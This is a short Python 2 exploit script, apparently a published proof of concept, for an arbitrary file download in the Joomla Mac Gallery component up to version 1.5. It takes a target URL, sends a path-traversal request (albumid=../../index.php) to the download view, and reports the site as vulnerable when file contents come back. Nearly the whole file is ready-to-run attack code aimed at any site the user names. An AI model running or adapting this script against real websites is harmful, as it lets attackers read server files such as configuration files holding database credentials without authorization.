#!/usr/bin/env python

# http connection
import urllib, urllib2
# Args management
import optparse
# Error managemen
import sys

banner = """
  

                            j00ml4 M4c G4ll3ry <= 1.5 4rb1tr4ry F1l3 D0wnl04d

                        Written by:

                      Claudio Viviani

                   http://www.homelab.it

                      info@homelab.it
                  homelabit@protonmail.ch

             https://www.facebook.com/homelabit
                https://twitter.com/homelabit
             https://plus.google.com/+HomelabIt1/
   https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

def connection(url,pathtrav):
    try:
        response = urllib2.urlopen(url+'/index.php?option=com_macgallery&view=download&albumid='+pathtrav+'index.php')
        content = response.read()
        if content != "":
            print '[!] VULNERABLE'
            print '[+] '+url+'/index.php?option=com_macgallery&view=download&albumid='+pathtrav+'index.php'
        else:
            print '[X] Not Vulnerable'
    except urllib2.HTTPError:
        print '[X] HTTP Error'
    except urllib2.URLError:
        print '[X] Connection Error'

commandList = optparse.OptionParser('usage: %prog -t URL')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.example.com[:PORT]",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)

url = checkurl(options.target)
pathtrav = "../../"

connection(url,pathtrav)

